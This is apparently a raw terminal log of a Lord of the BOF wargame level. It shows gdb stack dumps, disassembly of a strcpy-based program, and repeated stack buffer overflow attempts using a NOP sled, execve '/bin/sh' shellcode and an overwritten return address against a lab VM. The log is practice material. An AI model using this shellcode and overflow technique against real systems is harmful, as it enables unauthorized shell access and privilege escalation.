+0xbffffa30:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffa40:	0x90909090	0x90909090	0xbf009090	0x08048244
+0xbffffa50:	0x40021590	0x400143e0	0xbffffe26	0xbffffabf
+0xbffffa60:	0x00000020	0x401081ec	0xbffffaa0	0x4000a7fd
+0xbffffa70:	0x40010c27	0x40014680	0x00000007	0x4000a74e
+0xbffffa80:	0x08049510	0x4000ae60	0xbffffb14	0x40013ed0
+0xbffffa90:	0x08048170	0x0804951c	0x08048256	0x40021ca0
+0xbffffaa0:	0xbffffac8	0x4000a970	0x400f855b	0x08049510
+0xbffffab0:	0x4000ae60	0xbffffb14	0xbffffac8	0x0804841b
+0xbffffac0:	0x080494fc	0x08049510	0xbffffae8	0x400309cb
+0xbffffad0:	0x00000002	0xbffffb14	0xbffffb20	0x40013868
+0xbffffae0:	0x00000002	0x08048380	0x00000000	0x080483a1
+0xbffffaf0:	0x08048430	0x00000002	0xbffffb14	0x080482e0
+0xbffffb00:	0x080484bc	0x4000ae60	0xbffffb0c	0x40013e90
+0xbffffb10:	0x00000002	0xbffffc0b	0xbffffc1e	0x00000000
+0xbffffb20:	0xbffffca1	0xbffffcc3	0xbffffccd	0xbffffcdb
+0xbffffb30:	0xbffffcfa	0xbffffd07	0xbffffd1f	0xbffffd39
+0xbffffb40:	0xbffffd44	0xbffffd52	0xbffffd92	0xbffffda2
+(gdb) r `python -c 'print "\x90"*235+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/gate/grenlin `python -c 'print 
+
+"\x90"*235+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'`
+Traceback (innermost last):
+  File "<string>", line 1, in ?
+NameError: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+argv error
+
+Program exited normally.
+(gdb) r `python -c 'print "\x90"*235+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"'`
+Starting program: /home/gate/grenlin `python -c 'print 
+
+"\x90"*235+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"'`
+
+Breakpoint 1, 0x804846b in main (argc=1094795585, argv=0x41414141) at gremlin.c:14
+14	    strcpy(buffer, argv[1]);
+(gdb) x/100 $esp
+0xbffff920:	0xbffff928	0xbffffb82	0x90909090	0x90909090
+0xbffff930:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff940:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff950:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff960:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff970:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff980:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff990:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff9a0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff9b0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff9c0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff9d0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff9e0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffff9f0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffa00:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffa10:	0x41909090	0x41414141	0x41414141	0x41414141
+0xbffffa20:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffa30:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffffa40:	0x41414141	0x08004141	0x00000000	0x080483a1
+0xbffffa50:	0x08048430	0x00000002	0xbffffa74	0x080482e0
+0xbffffa60:	0x080484bc	0x4000ae60	0xbffffa6c	0x40013e90
+0xbffffa70:	0x00000002	0xbffffb6f	0xbffffb82	0x00000000
+0xbffffa80:	0xbffffca1	0xbffffcc3	0xbffffccd	0xbffffcdb
+0xbffffa90:	0xbffffcfa	0xbffffd07	0xbffffd1f	0xbffffd39
+0xbffffaa0:	0xbffffd44	0xbffffd52	0xbffffd92	0xbffffda2
+(gdb) r `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+
+\x89\xe3\x50\x53\x89"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Please answer y or n.
+The program being debugged has been started already.
+Start it from the beginning? (y or n) Please answer y or n.
+The program being debugged has been started already.
+Start it from the beginning? (y or n) ^[[A^[[Ay
+Please answer y or n.
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/gate/grenlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89"'`
+
+Breakpoint 1, 0x804846b in main (argc=2, argv=0xbffffa94) at gremlin.c:14
+14	    strcpy(buffer, argv[1]);
+(gdb) r `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e
+
+\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x20\xfa\xff\xbf"'`
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+
+Starting program: /home/gate/grenlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x20\xfa\xff\xbf"'`
+
+Breakpoint 1, 0x804846b in main (argc=3, argv=0xbffffa94) at gremlin.c:14
+14	    strcpy(buffer, argv[1]);
+(gdb) q
+The program is running.  Exit anyway? (y or n) y
+[gate@localhost gate]$ ./grenlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x20\xfa\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault (core dumped)
+[gate@localhost gate]$ ./grenlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ exit
+logout
+
+Connection closed by foreign host.
+
+Disconnected from remote host(192.168.56.128:23) at 01:44:24.
+
+Type `help' to learn how to use Xshell prompt.
+[c:\~]$ telnet 192.168.56.128
+
+
+Connecting to 192.168.56.128:23...
+Connection established.
+To escape to local shell, press 'Ctrl+Alt+]'.
+                                            _______________________
+  _______________________-------------------                       `\
+ /:--__                                                              |
+||< > |                                   ___________________________/
+| \__/_________________-------------------                         |
+|                                                                  |
+ |        The Lord of the BOF : The Fellowship of the BOF, 2010    |
+ |                                                                  |
+ |                                                                  |
+  |       [enter to the dungeon]                                    |
+  |       gate : gate                                                |
+  |                                                                  |
+  |       [RULE]                                                     |
+   |      - do not use local root exploit                             |
+   |      - do not use LD_PRELOAD to my-pass                          |
+   |      - do not use single boot                    [h4ck3rsch001] |
+  |                                              ____________________|_
+  |  ___________________-------------------------                      `\
+  |/`--_                                                                 |
+  ||[ ]||                                            ___________________/
+   \===/___________________-------------------------- 
+
+
+login: gate
+Password: 
+Last login: Sat Feb  3 01:18:57 from 192.168.56.1
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ mypass
+bash: mypass: command not found
+[gate@localhost gate]$ my-pass
+euid = 500
+I dunno
+[gate@localhost gate]$ whoami
+gate
+[gate@localhost gate]$ ls
+core  gremlin  gremlin.c  grenlin  tmp
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ls
+core  gremlin  gremlin.c  grenlin  tmp
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*236+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+¿
+[gate@localhost gate]$ bash2
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault
+[gate@localhost gate]$ id
+uid=500(gate) gid=500(gate) groups=500(gate)
+[gate@localhost gate]$ id
+uid=500(gate) gid=500(gate) groups=500(gate)
+[gate@localhost gate]$ gdb gremlin
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:	push   %ebp
+0x8048431 <main+1>:	mov    %esp,%ebp
+0x8048433 <main+3>:	sub    $0x100,%esp
+0x8048439 <main+9>:	cmpl   $0x1,0x8(%ebp)
+0x804843d <main+13>:	jg     0x8048456 <main+38>
+0x804843f <main+15>:	push   $0x80484e0
+0x8048444 <main+20>:	call   0x8048350 <printf>
+0x8048449 <main+25>:	add    $0x4,%esp
+0x804844c <main+28>:	push   $0x0
+0x804844e <main+30>:	call   0x8048360 <exit>
+0x8048453 <main+35>:	add    $0x4,%esp
+0x8048456 <main+38>:	mov    0xc(%ebp),%eax
+0x8048459 <main+41>:	add    $0x4,%eax
+0x804845c <main+44>:	mov    (%eax),%edx
+0x804845e <main+46>:	push   %edx
+0x804845f <main+47>:	lea    0xffffff00(%ebp),%eax
+0x8048465 <main+53>:	push   %eax
+0x8048466 <main+54>:	call   0x8048370 <strcpy>
+0x804846b <main+59>:	add    $0x8,%esp
+0x804846e <main+62>:	lea    0xffffff00(%ebp),%eax
+0x8048474 <main+68>:	push   %eax
+0x8048475 <main+69>:	push   $0x80484ec
+0x804847a <main+74>:	call   0x8048350 <printf>
+0x804847f <main+79>:	add    $0x8,%esp
+0x8048482 <main+82>:	leave  
+0x8048483 <main+83>:	ret    
+0x8048484 <main+84>:	nop    
+0x8048485 <main+85>:	nop    
+0x8048486 <main+86>:	nop    
+0x8048487 <main+87>:	nop    
+0x8048488 <main+88>:	nop    
+0x8048489 <main+89>:	nop    
+---Type <return> to continue, or q <return> to quit---
+0x804848a <main+90>:	nop    
+0x804848b <main+91>:	nop    
+0x804848c <main+92>:	nop    
+0x804848d <main+93>:	nop    
+0x804848e <main+94>:	nop    
+0x804848f <main+95>:	nop    
+End of assembler dump.
+(gdb) r `python -c 'print "A"*250'`
+Starting program: /home/gate/gremlin `python -c 'print "A"*250'`
+/bin/bash: /home/gate/gremlin: Operation not permitted
+/bin/bash: /home/gate/gremlin: Operation not permitted
+
+Program exited with code 01.
+You can't do that without a process to debug.
+(gdb) r `python -c 'print "A"*250'`
+Starting program: /home/gate/gremlin `python -c 'print "A"*250'`
+/bin/bash: /home/gate/gremlin: Operation not permitted
+/bin/bash: /home/gate/gremlin: Operation not permitted
+
+Program exited with code 01.
+You can't do that without a process to debug.
+(gdb) q
+[gate@localhost gate]$ gdb gremlin
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux"...
+(gdb) disas main
+Dump of assembler code for function main:
+0x8048430 <main>:	push   %ebp
+0x8048431 <main+1>:	mov    %esp,%ebp
+0x8048433 <main+3>:	sub    $0x100,%esp
+0x8048439 <main+9>:	cmpl   $0x1,0x8(%ebp)
+0x804843d <main+13>:	jg     0x8048456 <main+38>
+0x804843f <main+15>:	push   $0x80484e0
+0x8048444 <main+20>:	call   0x8048350 <printf>
+0x8048449 <main+25>:	add    $0x4,%esp
+0x804844c <main+28>:	push   $0x0
+0x804844e <main+30>:	call   0x8048360 <exit>
+0x8048453 <main+35>:	add    $0x4,%esp
+0x8048456 <main+38>:	mov    0xc(%ebp),%eax
+0x8048459 <main+41>:	add    $0x4,%eax
+0x804845c <main+44>:	mov    (%eax),%edx
+0x804845e <main+46>:	push   %edx
+0x804845f <main+47>:	lea    0xffffff00(%ebp),%eax
+0x8048465 <main+53>:	push   %eax
+0x8048466 <main+54>:	call   0x8048370 <strcpy>
+0x804846b <main+59>:	add    $0x8,%esp
+0x804846e <main+62>:	lea    0xffffff00(%ebp),%eax
+0x8048474 <main+68>:	push   %eax
+0x8048475 <main+69>:	push   $0x80484ec
+0x804847a <main+74>:	call   0x8048350 <printf>
+0x804847f <main+79>:	add    $0x8,%esp
+0x8048482 <main+82>:	leave  
+0x8048483 <main+83>:	ret    
+0x8048484 <main+84>:	nop    
+0x8048485 <main+85>:	nop    
+0x8048486 <main+86>:	nop    
+0x8048487 <main+87>:	nop    
+0x8048488 <main+88>:	nop    
+0x8048489 <main+89>:	nop    
+---Type <return> to continue, or q <return> to quit---b *main+59
+0x804848a <main+90>:	nop    
+0x804848b <main+91>:	nop    
+0x804848c <main+92>:	nop    
+0x804848d <main+93>:	nop    
+0x804848e <main+94>:	nop    
+0x804848f <main+95>:	nop    
+End of assembler dump.
+(gdb) b *main+59
+Breakpoint 1 at 0x804846b
+(gdb) r `python -c 'print "A"*250'`
+Starting program: /home/gate/gremlin `python -c 'print "A"*250'`
+/bin/bash: /home/gate/gremlin: Operation not permitted
+/bin/bash: /home/gate/gremlin: Operation not permitted
+
+Program exited with code 01.
+You can't do that without a process to debug.
+(gdb) x/ $esp
+No registers.
+(gdb) r a                          
+Starting program: /home/gate/gremlin a
+/bin/bash: /home/gate/gremlin: Operation not permitted
+/bin/bash: /home/gate/gremlin: Operation not permitted
+
+Program exited with code 01.
+You can't do that without a process to debug.
+(gdb) q  
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
+\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x20\xfa\xff\xbf"'`
+1￐h//shh/bin⏓ኂ°
+               ̀ 
+Segmentation fault
+[gate@localhost gate]$ gdb -c core
+GNU gdb 19991004
+Copyright 1998 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i386-redhat-linux".
+Core was generated by `./grenlin '.
+Program terminated with signal 11, Segmentation fault.
+#0  0x40030902 in ?? ()
+(gdb) x/ $esp
+0xbffffa50:	0x00000003
+(gdb) x/100 $esp
+0xbffffa50:	0x00000003	0xbffffa94	0xbffffaa4	0x40013868
+0xbffffa60:	0x00000003	0x08048380	0x00000000	0x080483a1
+0xbffffa70:	0x08048430	0x00000003	0xbffffa94	0x080482e0
+0xbffffa80:	0x080484bc	0x4000ae60	0xbffffa8c	0x40013e90
+0xbffffa90:	0x00000003	0xbffffb88	0xbffffb97	0xbffffc9c
+0xbffffaa0:	0x00000000	0xbffffc9e	0xbffffcc0	0xbffffcca
+0xbffffab0:	0xbffffcd8	0xbffffcf7	0xbffffd04	0xbffffd1c
+0xbffffac0:	0xbffffd36	0xbffffd41	0xbffffd4f	0xbffffd8f
+0xbffffad0:	0xbffffd9f	0xbffffdb4	0xbffffdc4	0xbffffdce
+0xbffffae0:	0xbffffdea	0xbffffe03	0xbffffe0e	0xbffffe1b
+0xbffffaf0:	0xbffffe23	0xbfffffe6	0x00000000	0x00000003
+0xbffffb00:	0x08048034	0x00000004	0x00000020	0x00000005
+0xbffffb10:	0x00000006	0x00000006	0x00001000	0x00000007
+0xbffffb20:	0x40000000	0x00000008	0x00000000	0x00000009
+0xbffffb30:	0x08048380	0x0000000b	0x000001f4	0x0000000c
+0xbffffb40:	0x000001f4	0x0000000d	0x000001f4	0x0000000e
+0xbffffb50:	0x000001f4	0x00000010	0x0fabfbff	0x0000000f
+0xbffffb60:	0xbffffb88	0x00000000	0x00000000	0x00000000
+0xbffffb70:	0x00000000	0x00000000	0x00000000	0x00000000
+0xbffffb80:	0x00000000	0x00000000	0x36383669	0x672f2e00
+0xbffffb90:	0x6c6e6572	0x90006e69	0x90909090	0x90909090
+0xbffffba0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbb0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbc0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbd0:	0x90909090	0x90909090	0x90909090	0x90909090
+(gdb) 
+0xbffffbe0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffbf0:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc00:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc10:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc20:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc30:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc40:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc50:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc60:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc70:	0x90909090	0x90909090	0x90909090	0x90909090
+0xbffffc80:	0xc0319090	0x2f2f6850	0x2f686873	0x896e6962
+0xbffffc90:	0x895350e3	0xb0c289e1	0x0080cd0b	0x454c00fa
+0xbffffca0:	0x504f5353	0x7c3d4e45	0x7273752f	0x6e69622f
+0xbffffcb0:	0x73656c2f	0x70697073	0x68732e65	0x00732520
+0xbffffcc0:	0x52455355	0x454d414e	0x4948003d	0x49535453
+0xbffffcd0:	0x313d455a	0x00303030	0x54534f48	0x454d414e
+0xbffffce0:	0x636f6c3d	0x6f686c61	0x6c2e7473	0x6c61636f
+0xbffffcf0:	0x616d6f64	0x4c006e69	0x414e474f	0x673d454d
+0xbffffd00:	0x00657461	0x4f4d4552	0x4f484554	0x313d5453
+0xbffffd10:	0x312e3239	0x352e3836	0x00312e36	0x4c49414d
+0xbffffd20:	0x61762f3d	0x70732f72	0x2f6c6f6f	0x6c69616d
+0xbffffd30:	0x7461672f	0x45540065	0x783d4d52	0x6d726574
+0xbffffd40:	0x534f4800	0x50595454	0x33693d45	0x50003638
+0xbffffd50:	0x3d485441	0x7273752f	0x636f6c2f	0x622f6c61
+0xbffffd60:	0x2f3a6e69	0x3a6e6962	0x7273752f	0x6e69622f
+(gdb) 
+0xbffffd70:	0x73752f3a	0x31582f72	0x2f365231	0x3a6e6962
+0xbffffd80:	0x6d6f682f	0x61672f65	0x622f6574	0x48006e69
+0xbffffd90:	0x3d454d4f	0x6d6f682f	0x61672f65	0x49006574
+0xbffffda0:	0x5455504e	0x2f3d4352	0x2f637465	0x75706e69
+0xbffffdb0:	0x00637274	0x4c454853	0x622f3d4c	0x622f6e69
+0xbffffdc0:	0x00687361	0x52455355	0x7461673d	0x41420065
+0xbffffdd0:	0x455f4853	0x2f3d564e	0x656d6f68	0x7461672f
+0xbffffde0:	0x622e2f65	0x72687361	0x49440063	0x414c5053
+0xbffffdf0:	0x39313d59	0x36312e32	0x36352e38	0x303a312e
+0xbffffe00:	0x4c00302e	0x3d474e41	0x555f6e65	0x534f0053
+0xbffffe10:	0x45505954	0x6e694c3d	0x53007875	0x4c564c48
+0xbffffe20:	0x4c00313d	0x4f435f53	0x53524f4c	0x3d6f6e3d
+0xbffffe30:	0x663a3030	0x30303d69	0x3d69643a	0x333b3130
+0xbffffe40:	0x6e6c3a34	0x3b31303d	0x703a3633	0x30343d69
+0xbffffe50:	0x3a33333b	0x303d6f73	0x35333b31	0x3d64623a
+0xbffffe60:	0x333b3034	0x31303b33	0x3d64633a	0x333b3034
+0xbffffe70:	0x31303b33	0x3d726f3a	0x303b3130	0x37333b35
+0xbffffe80:	0x3a31343b	0x303d696d	0x35303b31	0x3b37333b
+0xbffffe90:	0x653a3134	0x31303d78	0x3a32333b	0x6d632e2a
+0xbffffea0:	0x31303d64	0x3a32333b	0x78652e2a	0x31303d65
+0xbffffeb0:	0x3a32333b	0x6f632e2a	0x31303d6d	0x3a32333b
+0xbffffec0:	0x74622e2a	0x31303d6d	0x3a32333b	0x61622e2a
+0xbffffed0:	0x31303d74	0x3a32333b	0x68732e2a	0x3b31303d
+0xbffffee0:	0x2a3a3233	0x6873632e	0x3b31303d	0x2a3a3233
+0xbffffef0:	0x7261742e	0x3b31303d	0x2a3a3133	0x7a67742e
+(gdb) 
+0xbfffff00:	0x3b31303d	0x2a3a3133	0x6a72612e	0x3b31303d
+0xbfffff10:	0x2a3a3133	0x7a61742e	0x3b31303d	0x2a3a3133
+0xbfffff20:	0x687a6c2e	0x3b31303d	0x2a3a3133	0x70697a2e
+0xbfffff30:	0x3b31303d	0x2a3a3133	0x303d7a2e	0x31333b31
+0xbfffff40:	0x5a2e2a3a	0x3b31303d	0x2a3a3133	0x3d7a672e
+0xbfffff50:	0x333b3130	0x2e2a3a31	0x3d327a62	0x333b3130
+0xbfffff60:	0x2e2a3a31	0x303d7a62	0x31333b31	0x742e2a3a
+0xbfffff70:	0x31303d7a	0x3a31333b	0x70722e2a	0x31303d6d
+0xbfffff80:	0x3a31333b	0x70632e2a	0x303d6f69	0x31333b31
+0xbfffff90:	0x6a2e2a3a	0x303d6770	0x35333b31	0x672e2a3a
+0xbfffffa0:	0x303d6669	0x35333b31	0x622e2a3a	0x303d706d
+0xbfffffb0:	0x35333b31	0x782e2a3a	0x303d6d62	0x35333b31
+0xbfffffc0:	0x782e2a3a	0x303d6d70	0x35333b31	0x702e2a3a
+0xbfffffd0:	0x303d676e	0x35333b31	0x742e2a3a	0x303d6669
+0xbfffffe0:	0x35333b31	0x3d5f003a	0x72672f2e	0x696c6e65
+0xbffffff0:	0x2f2e006e	0x6e657267	0x006e696c	0x00000000
+0xc0000000:	Cannot access memory at address 0xc0000000
+(gdb) q         
+[gate@localhost gate]$ ./gremlin `python -c 'print "\x90"*235+"\x31\xc0\x50\x68\x2f\x2f
+
